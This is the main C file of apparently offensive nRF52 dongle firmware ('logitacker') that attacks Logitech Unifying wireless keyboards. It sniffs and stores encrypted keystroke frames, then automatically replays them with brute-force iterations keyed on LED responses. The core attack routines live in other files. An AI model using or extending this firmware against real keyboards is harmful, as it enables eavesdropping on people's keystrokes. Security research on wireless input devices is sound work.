#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include "nrf.h"
#include "nrf_esb_illegalmod.h"
#include "nrf_esb_illegalmod_error_codes.h"
#include "nrf_delay.h"
#include "nrf_drv_usbd.h"
#include "nrf_drv_clock.h"
#include "nrf_gpio.h"
#include "nrf_drv_power.h"

#include "app_timer.h"
#include "app_error.h"
#include "bsp.h"


#include "logitacker_usb.h"

// LOG
#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"

//CLI
#include "nrf_cli.h"
#include "nrf_cli_cdc_acm.h"

#include "app_scheduler.h"

//Flash FDS
#include <string.h>
#include "fds.h"
#include "flash_device_info.h"
#include "state.h"
#include "unifying.h"

#include "logitacker_bsp.h"
#include "logitacker_radio.h"
#include "logitacker.h"

//crypto
#include "nrf_crypto.h"
//#include "timestamp.h"


#define CHANNEL_HOP_RESTART_DELAY 1300

// Scheduler settings
#define SCHED_MAX_EVENT_DATA_SIZE   BYTES_PER_WORD*BYTES_TO_WORDS(MAX(NRF_ESB_CHECK_PROMISCUOUS_SCHED_EVENT_DATA_SIZE,MAX(APP_TIMER_SCHED_EVENT_DATA_SIZE,MAX(sizeof(nrf_esb_payload_t),MAX(sizeof(unifying_rf_record_set_t),sizeof(nrf_esb_evt_t))))))


#define SCHED_QUEUE_SIZE            16



#ifdef NRF52840_MDK
    bool with_log = true;
#else
    bool with_log = false;
#endif


#define AUTO_BRUTEFORCE true
static bool continue_frame_recording = true;
static bool enough_frames_recorded = false;
static bool continuo_redording_even_if_enough_frames = false;

uint32_t m_act_led = LED_B;
uint32_t m_channel_scan_led = LED_G;



// internal state
struct
{
    int16_t counter;    /**< Accumulated x state */
    int16_t lastCounter;
}m_state;



/* FDS */
/*
static dongle_state_t m_dongle_state = {
    .boot_count = 0,
    .device_info_count = 0,
};
*/

/*

// Flag to check fds initialization.
static bool volatile m_fds_initialized;

// Keep track of the progress of a delete_all operation. 
static struct
{
    bool delete_next;   //!< Delete next record.
    bool pending;       //!< Waiting for an fds FDS_EVT_DEL_RECORD event, to delete the next record.
} m_delete_all;


// Sleep until an event is received.
static void power_manage(void)
{
    __WFE();
}

static void wait_for_fds_ready(void)
{
    while (!m_fds_initialized)
    {
        power_manage();
    }
}

static void fds_evt_handler(fds_evt_t const * p_evt)
{
    // runs in thread mode
    //helper_log_priority("fds_evt_handler");
    switch (p_evt->id)
    {
        case FDS_EVT_INIT:
            if (p_evt->result == FDS_SUCCESS)
            {
                m_fds_initialized = true;
            }
            break;

        case FDS_EVT_WRITE:
        {
            if (p_evt->result == FDS_SUCCESS)
            {
                NRF_LOG_INFO("Record ID:\t0x%04x",  p_evt->write.record_id);
                NRF_LOG_INFO("File ID:\t0x%04x",    p_evt->write.file_id);
                NRF_LOG_INFO("Record key:\t0x%04x", p_evt->write.record_key);
            }
        } break;

        case FDS_EVT_DEL_RECORD:
        {
            if (p_evt->result == FDS_SUCCESS)
            {
                NRF_LOG_INFO("Record ID:\t0x%04x",  p_evt->del.record_id);
                NRF_LOG_INFO("File ID:\t0x%04x",    p_evt->del.file_id);
                NRF_LOG_INFO("Record key:\t0x%04x", p_evt->del.record_key);
            }
            m_delete_all.pending = false;
        } break;

        default:
            break;
    }
}
*/

bool m_auto_bruteforce_started = false;

uint8_t m_replay_count;
void unifying_event_handler(unifying_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case UNIFYING_EVENT_REPLAY_RECORDS_FAILED:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_FAILED");
            radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY); // timeout event if no RX

            // restart failed replay bruteforce
            if (!unifying_replay_records_LED_bruteforce_done(p_event->pipe)) {
                unifying_replay_records(p_event->pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
            }

            break;
        case UNIFYING_EVENT_REPLAY_RECORDS_FINISHED:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_FINISHED");

            // restart replay with bruteforce iteration, if not all records result in LED reports for response
            if (!unifying_replay_records_LED_bruteforce_done(p_event->pipe)) {
                m_replay_count++;
                if (m_replay_count == REPLAYS_BEFORE_BRUTEFORCE_ITERATION) {
                    NRF_LOG_INFO("Applying next bruteforce iteration to keyboard frames")
                    unifying_replay_records_LED_bruteforce_iteration(p_event->pipe);
                    m_replay_count = 0;
                }

                unifying_replay_records(p_event->pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
            } else {
                radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY); // timeout event if no RX
            }
            
            break;
        case UNIFYING_EVENT_REPLAY_RECORDS_STARTED:
            bsp_board_led_invert(LED_R);
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_STARTED");
            radio_stop_channel_hopping();
            break;
        case UNIFYING_EVENT_STORED_SUFFICIENT_ENCRYPTED_KEY_FRAMES:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_STORED_SUFFICIENT_ENCRYPTED_KEY_FRAMES");
            bsp_board_led_invert(LED_R);

            enough_frames_recorded = true;

            if (continuo_redording_even_if_enough_frames) continue_frame_recording = true; //go on recording, even if enough frames
            else continue_frame_recording = false; // don't record additional frames

            if (AUTO_BRUTEFORCE && !m_auto_bruteforce_started) {
                uint8_t pipe = 1;
                NRF_LOG_INFO("replay recorded frames for pipe 1");
                unifying_replay_records(pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
                m_auto_bruteforce_started = true;
            }
            break;
    }
}

void radio_event_handler(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_INFO("timeout reached without RX");
            radio_start_channel_hopping(30, 1, true);
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            //NRF_LOG_INFO("new chanel index %d", p_event->pipe);
            //toggle channel hop led, each time we hit the first channel again (channel index encoded in pipe parameter)
            bsp_board_led_invert(m_channel_scan_led); // toggle scan LED everytime we jumped through all channels 
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED:
        {
            NRF_LOG_DEBUG("new chanel index %d", p_event->channel_index);
            break;
        }
    }
}

NRF_CLI_CDC_ACM_DEF(m_cli_cdc_acm_transport);
NRF_CLI_DEF(m_cli_cdc_acm, "logitacker $ ", &m_cli_cdc_acm_transport.transport, '\r', 20);




int main(void)
{
    continue_frame_recording = true;

    // Note: For Makerdiary MDK dongle the button isn't working in event driven fashion (only BSP SIMPLE seems to be 
    // supported). Thus this code won't support button interaction on MDK dongle.

    ret_code_t ret;
    APP_SCHED_INIT(SCHED_MAX_EVENT_DATA_SIZE, SCHED_QUEUE_SIZE);
    
    ret = NRF_LOG_INIT(NULL);
    APP_ERROR_CHECK(ret);


    ret = nrf_drv_clock_init();
    APP_ERROR_CHECK(ret);

    nrf_drv_clock_lfclk_request(NULL);

    while(!nrf_drv_clock_lfclk_is_running())
    {
        /* Just waiting */
    }

    bsp_board_led_invert(LED_G);
    ret = nrf_crypto_init();
    APP_ERROR_CHECK(ret);

    bsp_board_led_invert(LED_G);

    ret = app_timer_init();
    APP_ERROR_CHECK(ret);

    logitacker_init();

/*
    //FDS
    // Register first to receive an event when initialization is complete.
    (void) fds_register(fds_evt_handler);
    //init
    ret = fds_init();
    APP_ERROR_CHECK(ret);
    // Wait for fds to initialize.
    wait_for_fds_ready();
*/

    if (with_log) {
        NRF_LOG_DEFAULT_BACKENDS_INIT();  
    } 

    /* CLI configured as NRF_LOG backend */
    ret = nrf_cli_init(&m_cli_cdc_acm, NULL, true, true, NRF_LOG_SEVERITY_INFO);
    APP_ERROR_CHECK(ret);
    ret = nrf_cli_start(&m_cli_cdc_acm);
    APP_ERROR_CHECK(ret);


    //high frequency clock needed for ESB
//    clocks_start();

    unifying_init(unifying_event_handler);

    //FDS
// ToDo: Debuf fds usage on pca10059
#ifndef BOARD_PCA10059
    restoreStateFromFlash(&m_dongle_state);

    //Try to load first device info record from flash, create if not existing
    ret = restoreDeviceInfoFromFlash(0, &m_current_device_info);
    if (ret != FDS_SUCCESS) {
        // restore failed, update/create record on flash with current data
        updateDeviceInfoOnFlash(0, &m_current_device_info); //ignore errors
    } 
#endif

//    timestamp_init();

    while (true)
    {
        app_sched_execute(); //!! esb_promiscuous mode frame validation is handled by scheduler !!
        //while (app_usbd_event_queue_process()) { }
        nrf_cli_process(&m_cli_cdc_acm);

        UNUSED_RETURN_VALUE(NRF_LOG_PROCESS());
        /* Sleep CPU only if there was no interrupt since last loop processing */
        __WFE();
    }
}
